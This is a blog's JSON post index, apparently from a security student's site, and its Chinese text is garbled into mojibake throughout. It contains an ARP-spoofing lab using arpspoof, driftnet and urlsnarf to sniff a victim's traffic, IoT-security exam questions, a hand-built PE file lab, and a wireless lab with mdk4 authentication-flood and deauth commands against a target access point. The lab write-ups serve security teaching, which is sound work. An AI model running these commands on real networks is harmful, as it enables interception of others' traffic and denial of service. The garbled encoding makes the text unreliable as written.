‡çš„è¿›å…¥å’Œå¤–å‡ºæ•°æ®ï¼Œä»è€Œå®ç°æ”»å‡»ã€‚å…¶ä¸­1ï¼Œ3éƒ½æ˜¯ARPæ¬ºéª—ï¼›2ï¼Œ4éƒ½æ˜¯è½¬å‘ã€‚ æŸ¥çœ‹ç½‘å¡ï¼Œç¡®ä¿wlan0å·²ç»è¿æ¥åˆ°ç›®æ ‡APã€‚ ifconfig æŸ¥çœ‹è·¯ç”±IP ip route show åœ¨kaliç³»ç»Ÿå¼€å¯IPV4ç½‘ç»œæ•°æ®åŒ…è½¬å‘åŠŸèƒ½ã€‚ sysctl -w net.ipv4.ip_forward=1 ARPæ¬ºéª— ä»¥Dsniffå·¥å…·é›†çš„arpspoofå‘½ä»¤ä¸ºä¾‹ arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host 1-i æŒ‡å®šä½¿ç”¨çš„æ¥å£ã€‚-c æŒ‡å®šå½“è¿˜åŸarpé…ç½®æ—¶tä½¿ç”¨çš„MACåœ°å€ï¼Œé»˜è®¤ä¸ºä½¿ç”¨åŸæ¥çš„MACã€‚ï¼ˆå³å½“åœæ­¢arpspoofå‘½ä»¤åï¼Œé»˜è®¤å–æ¶ˆæ¯’åŒ–ï¼‰-t æŒ‡å®šè¦æ¯’åŒ–çš„ä¸»æœºï¼Œå¦‚æœä¸æŒ‡å®šçš„è¯é»˜è®¤ä¸ºå±€åŸŸç½‘ä¸‹æ‰€æœ‰ä¸»æœºã€‚-r åŒå‘æ¯’åŒ–ï¼ˆhostå’Œtargetï¼‰ï¼Œä»è€ŒåŒå‘æ•æ‰æ•°æ®ã€‚ï¼ˆä»…å½“åŒæ—¶æŒ‡å®š -tçš„æ—¶å€™æ‰æœ‰æ•ˆï¼‰ host é€šå¸¸æ˜¯æœ¬åœ°ç½‘å…³ã€‚æ‰€æœ‰ä»targetåˆ°hostçš„æ•°æ®åŒ…éƒ½è¢«é‡å®šå‘åˆ°æœ¬æœºã€‚ ä½¿ç”¨arpspoof -i wlan0 -t 192.168.3.173 192.168.3.1 è¿›è¡ŒARPæ¬ºéª—ï¼Œå°†é¶æœº192.168.3.173å‘é€ç»™192.168.3.1çš„æ•°æ®åŒ…å…ˆå‘é€ç»™kaliä¸»æœºï¼Œå†ç”±ä¸»æœºè½¬å‘ã€‚ ä½¿ç”¨arpspoof -i wlan0 -t 192.168.3.1 192.168.3.173æˆªè·æ¥è‡ªè·¯ç”±å™¨çš„æ•°æ®åŒ…ã€‚å°†è·¯ç”±å™¨å‘ç»™é¶æœº192.168.3.173çš„æ•°æ®åŒ…å…ˆå‘é€ç»™kaliä¸»æœºï¼Œå†ç”±æœ¬æœºè½¬å‘ã€‚ è¾“å…¥driftnet -i wlan0è¿›è¡Œç›‘æ§ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªç›‘æ§æ¡†ï¼Œåœ¨é¶æœºä¸Šæµè§ˆç½‘é¡µï¼Œå°±ä¼šæ˜¾ç¤ºå‡ºé¶æœºæµè§ˆçš„å›¾ç‰‡ã€‚åªèƒ½å—…æ¢åˆ°æ²¡æœ‰åŠ å¯†çš„å›¾ç‰‡ã€‚ è¾“å…¥urlsnarf -i wlan0å—…æ¢é¶æœºè®¿é—®çš„ç½‘å€ã€‚ ç»“æŸæ”»å‡»ï¼Œå…³é—­æ•°æ®åŒ…è·¯ç”±åŠŸèƒ½sysctl -w net.ipv4.ip_forward=0 è¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–ç½‘ç»œæ´»åŠ¨ç›‘è§†å·¥å…·ï¼Œæ¯”å¦‚filesnarfã€mailsnarfã€ msgsnarfã€ webspy å’Œ sshowç­‰ï¼Œä½¿ç”¨æ–¹å¼å’Œurlsnarfå·®ä¸å¤šã€‚ä¹Ÿå¯ä»¥é€šè¿‡ä½¿ç”¨Ettercapæ¥è¿›è¡ŒARPæ¬ºéª—ã€‚Ettercapæ˜¯ä¸€ä¸ªå¤šç”¨é€”çš„å¼€æºå·¥å…·ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œå—…æ¢ã€ä¸»æœºåˆ†æç­‰ã€‚è¾“å…¥ettercap -Gå°±å¯è¿›å…¥å›¾å½¢åŒ–æ“ä½œç•Œé¢ï¼Œè¯·å¤§å®¶è‡ªè¡Œå°è¯•ã€‚ è¯¾åé¢˜éƒ¨åˆ†æ£€ç´¢ç›®å½•(ç‰©è”ç½‘å®‰å…¨å¯¼è®ºç¬¬ä¸€ç‰ˆã€æè”å®ç¼–è‘—ã€‘)ç®€è¿°ç‰©è”ç½‘çš„å®‰å…¨ç‰¹å¾ P4 ç‰©è”ç½‘ä»åŠŸèƒ½ä¸Šæ¥è¯´å…·å¤‡å“ªå‡ ä¸ªç‰¹å¾ï¼Ÿ P5 æŒ‰ç…§ç§‘å­¦ã€ä¸¥è°¨çš„è¡¨è¿°ï¼Œç‰©è”ç½‘ç»“æ„åº”åˆ†ä¸ºå“ªå‡ å±‚ï¼Ÿ P5 ç®€è¿°ç‰©è”ç½‘ä¸­çš„ä¸šåŠ¡è®¤è¯æœºåˆ¶ã€‚ ï¼°11 ç‰©è”ç½‘ä¸­çš„åŠ å¯†æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿ ï¼°12 æ„ŸçŸ¥è¯†åˆ«å±‚å¯èƒ½é‡åˆ°çš„å®‰å…¨æŒ‘æˆ˜åŒ…æ‹¬å“ªå‡ ç§æƒ…å†µï¼Ÿ ï¼°14 ç‰©è”ç½‘ä¸­çš„åŠ å¯†æœºåˆ¶å®æ–½æ—¶çš„ä¸»è¦å›°éš¾æ˜¯ä»€ä¹ˆï¼Ÿ ï¼°30 ç‰©è”ç½‘å¯†é’¥ç®¡ç†ç³»ç»Ÿé¢ä¸´å“ªä¸¤ä¸ªä¸»è¦é—®é¢˜ï¼Ÿ P 31 ç‰©è”ç½‘çš„æ•°æ®è¦ç»è¿‡å“ªå‡ å±‚å¤„ç†æµç¨‹ï¼Ÿ ï¼°33 ä»€ä¹ˆæ˜¯å®‰å…¨è·¯ç”±åè®®ï¼ŸæŒ‰è·¯ç”±ç®—æ³•çš„å®ç°æ–¹æ³•åˆ’åˆ†ï¼Œé€šå¸¸æœ‰å“ªå‡ ç§è·¯ç”±ï¼Ÿ P 33ï½34 ä¼ æ„Ÿå™¨ç½‘ç»œå¯èƒ½å—åˆ°å“ªå‡ ç§æ”»å‡»ï¼Ÿ å¯¹åº”çš„è§£å†³æ–¹æ¡ˆæ˜¯ä»€ä¹ˆï¼Ÿ ï¼°34 æ— çº¿ä¼ æ„Ÿå™¨ç½‘ç»œä¸­çš„è®¤è¯æŠ€æœ¯æœ‰å“ªå‡ ç§ï¼Ÿ P 35 å¤å…¸å¯†ç å­¦ä¸»è¦åˆ†æˆå“ªå‡ ç§ç±»å‹ï¼Ÿè¯·è¯¦è¿°å…¶ä¸­ä¸€ç§ã€‚ ï¼°41 åŸºäºé›¶çŸ¥è¯†è¯æ˜çš„è¯†åˆ«æŠ€æœ¯åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ ï¼°72 ç‰©è”ç½‘å¯†é’¥ç®¡ç†æµç¨‹æœ‰å“ªäº›æ­¥éª¤ï¼Ÿ ï¼°74ï½76 ä¾æ®æ ‡ç­¾çš„èƒ½é‡æ¥æºå¯ä»¥å°†æ ‡ç­¾åˆ†ä¸ºå“ªå‡ å¤§ç±»ï¼Ÿ ï¼° 84 RFID æ”»å‡»æ¨¡å¼æœ‰å“ªå‡ ç§ï¼Ÿ ï¼°86 ç®€è¦è¯´æ˜RFID ç³»ç»Ÿçš„é€šä¿¡æ¨¡å‹ã€‚ ï¼°87 å®‰å…¨RFID ç³»ç»Ÿçš„åŸºæœ¬ç‰¹å¾æ˜¯ä»€ä¹ˆ ï¼Ÿ ï¼°89 ï½ 90 EPC ç³»ç»Ÿå®‰å…¨é—®é¢˜ä¸»è¦æœ‰å“ªå‡ å¤§ç±» ï¼Ÿ ï¼° 93 è¯·è¿›è¡ŒEPC globalç³»ç»Ÿçš„çºµå‘å®‰å…¨å’Œéšç§å¨èƒåˆ†æã€‚ ï¼°94 é’ˆå¯¹RFID EPCæ ‡ç­¾çš„ä¸ªäººéšç§å¨èƒæœ‰å“ªäº›ï¼Ÿ ï¼°95 å¦‚ä½•é‡‡ç”¨å¯†ç æœºåˆ¶è§£å†³RFIDçš„å®‰å…¨é—®é¢˜ï¼Ÿä¸¾ä¸¤ä¸‰ä¸ªä¾‹å­å¯¹RFIDå®‰å…¨åè®®è¿›è¡Œè¯´æ˜ã€‚ ï¼°97 æ— çº¿ä¼ æ„Ÿå™¨ç½‘ç»œä¸å®‰å…¨ç›¸å…³çš„ç‰¹ç‚¹æœ‰å“ªäº›ï¼Ÿ ï¼°105 ç®€å•åˆ†ææ— çº¿ä¼ æ„Ÿå™¨ç½‘ç»œçš„å®‰å…¨å¨èƒã€‚ ï¼°106 æ— çº¿ä¼ æ„Ÿå™¨ç½‘ç»œçš„æ”»å‡»å½¢å¼æœ‰å“ªå‡ ç§ï¼Ÿ ï¼° 108ï½109 å¦‚ä½•é‡‡ç”¨å®‰å…¨è·¯ç”±æ¥å¢åŠ ç½‘ç»œçš„å®‰å…¨æ€§ï¼Ÿæœ‰å“ªäº›å¸¸ç”¨çš„æ–¹å¼ï¼Ÿ ï¼°112 ç®€è¿°æ¶‰åŠæ— çº¿ä¼ æ„Ÿå™¨ç½‘ç»œçš„4ç§å®‰å…¨æŠ€æœ¯ ï¼°113ï½114 ç®€è¦è¯´æ˜ZigBeeæŠ€æœ¯åœ¨å®‰å…¨æ–¹é¢çš„å…·ä½“ç‰¹ç‚¹ã€‚ ï¼°118ï½119 ä»€ä¹ˆæ˜¯ZigBeeä¿¡ä»»ä¸­å¿ƒï¼Ÿå®ƒèƒ½æä¾›å“ªå‡ ç§åŠŸèƒ½ï¼Ÿ ï¼°122 ä¸ºäº†æ»¡è¶³å®‰å…¨æ€§éœ€æ±‚ã€‚ZigBeeæ ‡å‡†ä½¿ç”¨å“ªå‡ ç§æ–¹æ³•æ¥ç¡®ä¿å®‰å…¨ï¼Ÿ ï¼°123 ç®€è¦è§£é‡Šç‰©è”ç½‘ç½‘ç»œæ„å»ºå±‚çš„å®‰å…¨åˆ†ç±»ï¼Ÿ ï¼°127 å¦‚ä½•ä¿è¯æ— çº¿ç½‘ç»œçš„å®‰å…¨è¿æ¥ï¼Ÿ ï¼°127ï½128 æ— çº¿é€šä¿¡ç½‘ç»œä¸­çš„ä¸å®‰å…¨å› ç´ ä¸»è¦æœ‰å“ªå‡ ä¸ªæ–¹é¢ï¼Ÿ ï¼°129ï½ 131 ç®€è¿°WAPåº”ç”¨é¢ä¸´çš„å®‰å…¨å¨èƒã€‚ ï¼° 132 ä¸ºäº†åº”å¯¹è¿™äº›å®‰å…¨æ¼æ´ï¼Œç›®å‰å·²ç»æå‡ºçš„ç«¯åˆ°ç«¯çš„å®‰å…¨æ¨¡å‹ä¸»è¦æœ‰å“ªå‡ ç§ï¼Ÿ ï¼°134 è“ç‰™æœåŠ¡çš„å®‰å…¨ä¸»è¦ç”±å“ªå‡ æ–¹é¢æ¥ä¿è¯ï¼Ÿ ï¼°145 æ„ŸçŸ¥ç»ˆç«¯ç›®å‰å­˜åœ¨çš„ä¸»è¦é—®é¢˜æ˜¯ä»€ä¹ˆï¼Ÿ ï¼°156 è¿›è¡Œæ“ä½œç³»ç»Ÿã€æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå’Œä¸­é—´ä»¶çš„ç±»æ¯”ã€‚ P212 æŒ‰ç½‘ç»œåŠŸèƒ½å­ç³»ç»Ÿç»†åˆ†ï¼Œæœ‰å“ªå‡ ç±»ç½‘ç»œä¸­é—´ä»¶ï¼Ÿ ï¼°213 ç®€è¿°äº‘è®¡ç®—é€»è¾‘ç»“æ„ã€‚ ï¼° 218ï½219 äº‘è®¡ç®—çš„ä¸»è¦æœåŠ¡å½¢å¼æœ‰å“ªå‡ ç§ï¼Ÿ ï¼°222 äº‘å®‰å…¨ä¸»è¦åŒ…å«å“ªä¸¤ä¸ªæ–¹é¢çš„å«ä¹‰ï¼Ÿ ï¼°225 è¦æƒ³å»ºç«‹äº‘å®‰å…¨ç³»ç»Ÿï¼Œå¹¶ä½¿ä¹‹æ­£å¸¸è¿è¡Œï¼Œéœ€è¦è§£å†³å“ª4ä¸ªæ–¹é¢çš„é—®é¢˜ï¼Ÿ ï¼°226 ç®€è¦è¯´æ˜äº‘è®¡ç®—å¹³å°çš„å®‰å…¨ä¸åˆ’åˆ†çš„åŸºæœ¬åŸåˆ™ã€‚ ï¼°253 ç®€å•æè¿°ä¿¡æ¯éšè—å’Œå¯†ç æŠ€æœ¯çš„åŒºåˆ«ã€‚ ï¼°272 ä¿¡æ¯åŠ å¯†å’Œéšè—å¯ä»¥åˆ†ä¸ºå“ª3ç§æ¨¡å¼ï¼Ÿ ï¼°273 ä¿¡æ¯éšè—æŠ€æœ¯ä¸»è¦ç”±å“ªä¸¤éƒ¨åˆ†ç»„æˆï¼Ÿ ï¼°276 ç®€è¦è¯´æ˜ä¿¡æ¯éšè—ç³»ç»Ÿçš„ç‰¹å¾ã€‚ ï¼°276 ä¿¡æ¯éšè—çš„ä¸»è¦æ–¹æ³•æœ‰å“ªå‡ ç§ ï¼Ÿ ï¼°277 ä»€ä¹ˆæ˜¯éšè—åŒ¿åé€šä¿¡æŠ€æœ¯ï¼Ÿ ï¼°279 æ•°æ®éšå†™æœ¯å¯ä»¥åˆ†æˆå“ªå‡ ç±»ï¼Ÿ ï¼°280 éšè”½ä¿¡é“çš„å®šä¹‰æ˜¯ä»€ä¹ˆï¼Ÿ ï¼°285 é€šç”¨çš„æ•°å­—æ°´å°ç®—æ³•åŒ…å«å“ªä¸¤ä¸ªåŸºæœ¬æ–¹é¢ï¼Ÿ ï¼°297 åè¯è§£é‡ŠIOT (Internet of Things) ç‰©è”ç½‘ DES (Data Encryption Standard) æ•°æ®åŠ å¯†æ ‡å‡† AES (Advanced Encryption Standard) é«˜çº§åŠ å¯†æ ‡å‡† ZKP (Zero Knowledge Proof) é›¶çŸ¥è¯†è¯æ˜ MDP (Minimum Disclosure Proof) æœ€å°æ³„éœ²è¯æ˜ RFID (Radio Frequency IDentification) æ— çº¿å°„é¢‘è¯†åˆ« PKI (Public Key Infrastructure) å…¬å¼€å¯†é’¥åŸºç¡€è®¾æ–½","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"ç‰©è”ç½‘","slug":"æœŸæœ«è€ƒè¯•/ç‰©è”ç½‘","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%89%A9%E8%81%94%E7%BD%91/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"æ‰‹å·¥æ‰“é€ PEæ–‡ä»¶","slug":"æ‰‹å·¥æ‰“é€ PEæ–‡ä»¶","date":"2021-05-28T09:14:50.000Z","updated":"2024-11-12T07:00:05.000Z","comments":true,"path":"2021/05/28/æ‰‹å·¥æ‰“é€ PEæ–‡ä»¶/","permalink":"https://gryffinbit.top/2021/05/28/%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0PE%E6%96%87%E4%BB%B6/","excerpt":"","text":"å‚è€ƒæ•™æhttps://gryffinbit.lanzoui.com/imk3fpk3pfi å®éªŒç›®çš„é€šè¿‡åˆ©ç”¨C32asmï¼Œæ‰‹å·¥ç¼–å†™ä¸€ä¸ªWin32å¹³å°ä¸‹çš„PEæ–‡ä»¶ï¼Œè¿›ä¸€æ­¥ç†Ÿç»ƒæŒæ¡PEæ–‡ä»¶çš„ç»“æ„ã€‚ å®éªŒå†…å®¹å‚è€ƒæ•™æP119-132ï¼Œæ‰‹å·¥æ‰“é€ ä¸€ä¸ªPEæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ‰§è¡Œåè¾“å‡ºå¦‚ä¸‹å†…å®¹ï¼š å®éªŒç»“æœ1. æ„é€ IMAGE_DOS_HEADERç»“æ„è¯¥ç»“æ„ä½“çš„å¤§å°ä¸º 40h å­—èŠ‚(åè¿›åˆ¶çš„64 å­—èŠ‚) ã€‚æ‰“å¼€ hex ç¼–è¾‘å™¨ï¼Œå¡«å…¥64 ä¸ªå­—èŠ‚çš„0ï¼Œç„¶åæ ¹æ®IMAGE_DOS_HEADERçš„ç»“æ„è¿›è¡Œä¿®æ”¹ï¼Œ 2. æ„é€ PEæ ‡è¯†ç¬¦åœ¨æ„é€ å®Œ DOS å¤´å,ç´§è·Ÿç€æ„é€  PE æ ‡è¯†ç¬¦,PE æ ‡è¯†ç¬¦å  4 ä¸ªå­—èŠ‚,å› æ­¤hexä¸­å¢åŠ  4 ä¸ªå­—èŠ‚çš„æ•°æ®ï¼ŒPE æ ‡è¯†ç¬¦å¯¹åº”çš„åå…­è¿›åˆ¶æ•°æ®ä¸º â€œ50 45 00 00â€ 3. æ„é€  IMAGE_FILE_HEADER ç»“æ„è¯¥ç»“æ„ä½“çš„å¤§å°ä¸º 14h å­—èŠ‚(åè¿›åˆ¶çš„ 20 å­—èŠ‚) ,åŒæ ·hexä¸­æ’å…¥ 20 ä¸ªå­—èŠ‚çš„å…¨ 0 æ•°æ®,ç„¶åè¿›è¡Œæ•°æ®çš„ä¿®æ”¹å¡«å……ã€‚ 4. æ„é€  IMAGE_OPTIONAL_HEADER ç»“æ„è¯¥ç»“æ„ä½“çš„å¤§å°ä¸º 0E0h å­—èŠ‚(åè¿›åˆ¶çš„ 224 å­—èŠ‚) ,åœ¨ hex ä¸­å¡«å…… 224 å­—èŠ‚çš„å…¨ 0 æ•°æ®,ç„¶åæŒ‰ç…§è¡¨ 5-3 æ‰€åˆ—è¿›è¡Œå¡«å……ï¼Œæœ€ç»ˆå¡«å……ç»“æœ 5. æ„é€  IMAGE_SECTION_HEADER ç»“æ„IMAGE_SECTION_HEADER ç»“æ„ä½“çš„å¤§å°æ˜¯ 40 å­—èŠ‚, ç”±äºéœ€è¦æ„é€  3 ä¸ªèŠ‚è¡¨é¡¹, å› æ­¤èŠ‚è¡¨å¤§å°å  120 å­—èŠ‚ã€‚èŠ‚è¡¨çš„å¡«å……å¦‚è¡¨ 5-4 æ‰€åˆ—ã€‚æœ€ç»ˆå¡«å……ç»“æœ 6. 0 æ•°æ®çš„å¡«å……ç”±äºéœ€è¦æŒ‰ç…§ 0x00001000 çš„é•¿åº¦æ¥è¿›è¡Œå¯¹é½,å› æ­¤ç”¨ 0x1000âˆ’0x01B0&#x3D;0x0E50,å³åè¿›åˆ¶æ•°çš„ 3664ã€‚åœ¨ hex ä¸­æ’å…¥â€œ3664â€ä¸ª 0 å­—ç¬¦å°† PE æ–‡ä»¶å¤´æŒ‰ç…§ IMAGE_OPTIONAL_ HEADER çš„ SizeOfHeader è¿›è¡Œå¯¹é½ã€‚åœ¨æ’å…¥ 3664 ä¸ª 0 å­—ç¬¦å,æ–‡ä»¶çš„ç»“æŸåç§»åœ°å€æ˜¯0x00000FFFã€‚åœ¨å¡«å……å®Œ PE æ–‡ä»¶å¤´éƒ¨å,éœ€è¦ç»§ç»­å¡«å…… 0x00001000 å­—èŠ‚çš„ 0 å­—ç¬¦,è¯¥ 0x00001000 å­—èŠ‚çš„æ•°æ®ç”¨æ¥å­˜æ”¾.text èŠ‚çš„å†…å®¹,å³ä»£ç èŠ‚çš„å†…å®¹ã€‚ç»§ç»­ä½¿ç”¨ C32Asm æ’å…¥ 4096 ä¸ª 0 å­—ç¬¦ã€‚ç”±äºä»£ç èŠ‚æ˜¯æœ€åå®Œæˆçš„éƒ¨åˆ†,å› æ­¤è¿™é‡Œåªæ˜¯å…ˆå¯¹å…¶å¡«å…… 0 å­—ç¬¦ã€‚ 7. å¡«å…….data èŠ‚çš„æ•°æ® æ³¨æ„æ¯”ç‰¹æ•°è¦ä¿æŒä¸€è‡´ 8. å¡«å…….idata èŠ‚çš„æ•°æ®æœ€ç»ˆå¡«å……æ•°æ® ä½¿ç”¨LordPEæ£€æŸ¥ 9. å¡«å…….text èŠ‚çš„æ•°æ®ODæ‰“å¼€å é€šè¿‡ Ctrl+G å¿«æ·é”®æ¥åˆ°åœ°å€ 0x00403000 å¤„,æŸ¥çœ‹å¯¼å…¥è¡¨çš„ä¿¡æ¯ å¡«å†™åæ±‡ç¼–ä»£ç  æœ€ç»ˆç»“æœ","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"é€†å‘","slug":"å®éªŒ/é€†å‘","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"}],"tags":[{"name":"PE","slug":"PE","permalink":"https://gryffinbit.top/tags/PE/"}],"author":"Gryffinbit"},{"title":"æ”»å‡»æ— çº¿AP","slug":"æ”»å‡»æ— çº¿AP","date":"2021-05-21T16:45:44.000Z","updated":"2024-11-12T07:00:16.000Z","comments":true,"path":"2021/05/22/æ”»å‡»æ— çº¿AP/","permalink":"https://gryffinbit.top/2021/05/22/%E6%94%BB%E5%87%BB%E6%97%A0%E7%BA%BFAP/","excerpt":"","text":"å®éªŒç›®çš„æŒæ¡è®¤è¯æ´ªæ°´æ”»å‡»ã€Deauthæ”»å‡»å’Œå‡ä¿¡æ ‡æ´ªæ°´æ”»å‡»çš„åŸç†ã€‚åˆ©ç”¨mdk4å·¥å…·èƒ½å¤Ÿå®ç°ç›¸åº”çš„æ”»å‡»æ–¹æ³•ã€‚èƒ½å¤Ÿåˆ©ç”¨wiresharkå·¥å…·åŒºåˆ†è®¤è¯ï¼ˆAuthenticationï¼‰æ•°æ®åŒ…ã€å–æ¶ˆè®¤è¯ï¼ˆDeauthenticationï¼‰æ•°æ®åŒ…å’Œä¿¡æ ‡å¸§ï¼ˆbeacon frameï¼‰ã€‚ å®éªŒç¯å¢ƒKaliæ“ä½œç³»ç»ŸåŠç›¸å…³å·¥å…·æ— çº¿ç½‘å¡æ— çº¿AP å®éªŒåŸç†è®¤è¯æ´ªæ°´æ”»å‡»APè®¤è¯æ´ªæ°´æ”»å‡»ï¼Œå°±æ˜¯å‘APå‘é€å¤§é‡è™šå‡çš„è¿æ¥è¯·æ±‚ã€‚å½“å‘é€çš„è¯·æ±‚è¶…è¿‡APæ‰€èƒ½æ‰¿å—çš„èŒƒå›´æ—¶ï¼ŒAPå°±ä¼šè‡ªåŠ¨æ–­å¼€ç°æœ‰è¿æ¥ï¼Œä½¿å¾—åˆæ³•ç”¨æˆ·æ— æ³•ä½¿ç”¨ç½‘ç»œã€‚ Deauthæ”»å‡»å–æ¶ˆè®¤è¯æ´ªæ°´æ”»å‡»De-authentication Flood Attackç®€ç§°Deauthæ”»å‡»ã€‚è¯¥æ”»å‡»æ–¹å¼ä¸»è¦æ˜¯é€šè¿‡ä¼ªé€ APå‘å®¢æˆ·ç«¯å•æ’­åœ°å€å‘é€å–æ¶ˆèº«ä»½éªŒè¯å¸§ï¼Œå°†å®¢æˆ·ç«¯è½¬ä¸ºæœªå…³è”&#x2F;æœªè®¤è¯çš„çŠ¶æ€ã€‚ å‡ä¿¡æ ‡æ´ªæ°´æ”»å‡»å‡ä¿¡æ ‡æ”»å‡»ç±»ä¼¼äºä¼ªAPï¼Œå°±æ˜¯å‘æ— çº¿ä¿¡é“ä¸­å‘é€å¤§é‡è™šå‡çš„SSIDæ¥å……æ–¥å®¢æˆ·ç«¯çš„æ— çº¿åˆ—è¡¨ï¼Œé€šè¿‡åˆ›å»ºæ¶æ„æ— çº¿çƒ­ç‚¹ï¼Œå ç”¨ä¿¡é“èµ„æºï¼Œå¹²æ‰°é€šè®¯ã€‚ å®éªŒè¿‡ç¨‹è®¤è¯æ´ªæ°´æ”»å‡» è®¤è¯æ´ªæ°´æ”»å‡»å…·ä½“å·¥ä½œæµç¨‹ï¼š1.ç¡®å®šå½“å‰æ— çº¿ç½‘ç»œä¸­ï¼Œå®¢æˆ·ç«¯ä¸APå·²ç»å»ºç«‹äº†è¿æ¥ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ‰€æœ‰æ— çº¿å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚éƒ½ä¼šè¢«APè®°å½•åœ¨è¿æ¥è¡¨ä¸­ã€‚2.æ”»å‡»è€…ä½¿ç”¨ä¸€äº›çœ‹èµ·æ¥åˆæ³•ä½†å…¶å®æ˜¯éšæœºç”Ÿæˆçš„MACåœ°å€æ¥ä¼ªé€ STAã€‚ç„¶åï¼Œæ”»å‡»è€…å°±å¯ä»¥å‘é€å¤§é‡çš„è™šå‡è¿æ¥è¯·æ±‚åˆ°APã€‚3.æ”»å‡»è€…å¯¹APè¿›è¡ŒæŒç»­ä¸”å¤§é‡çš„è™šå‡è¿æ¥è¯·æ±‚ï¼Œæœ€ç»ˆå¯¼è‡´APå¤±å»å“åº”ï¼Œä½¿å¾—APçš„è¿æ¥åˆ—è¡¨å‡ºç°é”™è¯¯ã€‚4.ç”±äºAPçš„è¿æ¥è¡¨å‡ºç°é”™è¯¯ï¼Œä½¿å¾—è¿æ¥çš„åˆæ³•å®¢æˆ·ç«¯å¼ºåˆ¶ä¸APæ–­å¼€è¿æ¥ã€‚ å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1mdk4 &lt;interface&gt; a &lt;test_options&gt; interface:æŒ‡å®šç”¨äºæ”»å‡»çš„ç½‘ç»œæ¥å£ï¼Œéœ€æ˜¯ç›‘å¬æ¨¡å¼çš„æ¥å£ã€‚ 1234a: å®æ–½èº«ä»½éªŒè¯æ´ªæ°´æ”»å‡»æ¨¡å¼ã€‚-a: æŒ‡å®šè¦æ”»å‡»çš„ç›®æ ‡APçš„MACåœ°å€ã€‚-mï¼šä½¿ç”¨æœ‰æ•ˆæ•°æ®åº“ä¸­çš„å®¢æˆ·ç«¯MACåœ°å€ã€‚-sï¼šè®¾ç½®åŒ…çš„é€Ÿç‡ï¼Œé»˜è®¤æ— é™åˆ¶ã€‚ 1mdk4 wlan0mon a -a 78:A3:51:15:67:C6 -m ä½¿ç”¨airodump-ngç›‘æµ‹ï¼Œå¯ä»¥çœ‹åˆ°ç•Œé¢ä¸‹æ–¹ç¬é—´å‡ºç°äº†å¤§é‡çš„ä¼ªé€ å®¢æˆ·ç«¯ï¼Œä¸”è¿æ¥çš„ç›®æ ‡APå‡ä¸ºâ€(æ”»å‡»çš„Mac)â€ã€‚ 1airodump-ng wlan0mon --bssid 78:A3:51:15:67:C6 -c 11 å¦‚æœæ”»å‡»ä¸æˆåŠŸï¼Œåœ¨æ‰“å¼€ç›‘å¬æ¨¡å¼æ—¶ï¼Œå°±é€‰æ‹©APæ‰€åœ¨çš„ä¿¡é“è¿›è¡Œç›‘å¬ã€‚ Deauthæ”»å‡»Deauthæ”»å‡»æµç¨‹ï¼š1.ç¡®å®šå½“å‰æ— çº¿ç½‘ç»œä¸­å®¢æˆ·ç«¯ä¸APå·²ç»å»ºç«‹äº†è¿æ¥ã€‚2.æ”»å‡»è€…å‘æ•´ä¸ªç½‘ç»œå‘é€ä¼ªé€ çš„å–æ¶ˆèº«ä»½è®¤è¯æŠ¥æ–‡ï¼Œä»è€Œé˜»æ–­åˆæ³•ç”¨æˆ·å’ŒAPé—´çš„è¿æ¥ã€‚3.å½“å®¢æˆ·ç«¯æ”¶åˆ°æ”»å‡»è€…å‘é€çš„æŠ¥æ–‡æ—¶ï¼Œä¼šè®¤ä¸ºè¯¥æŠ¥æ–‡æ¥è‡ªAPã€‚æ­¤æ—¶ï¼Œå®¢æˆ·ç«¯å°†è¯•å›¾ä¸APé‡æ–°å»ºç«‹è¿æ¥ã€‚4.æ”»å‡»è€…ä»ç„¶ç»§ç»­å‘ä¿¡é“ä¸­å‘é€å–æ¶ˆèº«ä»½è®¤è¯å¸§ï¼Œå°†å¯¼è‡´å®¢æˆ·ç«¯ä¸APå§‹ç»ˆæ— æ³•é‡è¿ï¼Œå³å·²è¿æ¥çš„å®¢æˆ·ç«¯è‡ªè¡Œæ–­å¼€è¿æ¥ã€‚ ä½¿ç”¨mdk4å®æ–½Deauthæ”»å‡»çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1mdk4 &lt;interface&gt; d &lt;test_options&gt; interface:æŒ‡å®šç”¨äºæ”»å‡»çš„ç½‘ç»œæ¥å£ï¼Œéœ€æ˜¯ç›‘å¬æ¨¡å¼çš„æ¥å£ã€‚ 1234d: å®æ–½Deauthæ”»å‡»æ”»å‡»æ¨¡å¼ã€‚-sï¼šè®¾ç½®åŒ…çš„é€Ÿç‡ï¼Œé»˜è®¤æ— é™åˆ¶ã€‚-cï¼šæŒ‡å®šæ”»å‡»çš„ä¿¡é“ï¼Œé»˜è®¤å°†åœ¨æ‰€æœ‰ä¿¡é“ä¹‹é—´è·³è½¬ï¼Œæ¯3ç§’åˆ‡æ¢ä¸€æ¬¡ã€‚-E:æ”»å‡»æŒ‡å®šESSIDçš„APã€‚ -Bï¼šæ”»å‡»æŒ‡å®šBSSIDçš„APã€‚ å°†æ— çº¿ç½‘å¡è®¾ç½®ä¸ºç›‘å¬æ¨¡å¼ã€‚ç”¨mdk4å®æ–½Deauthæ”»å‡»ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤åï¼Œå°†ä¼šè¾“å‡ºä»¥ä¸‹ä¿¡æ¯ã€‚ 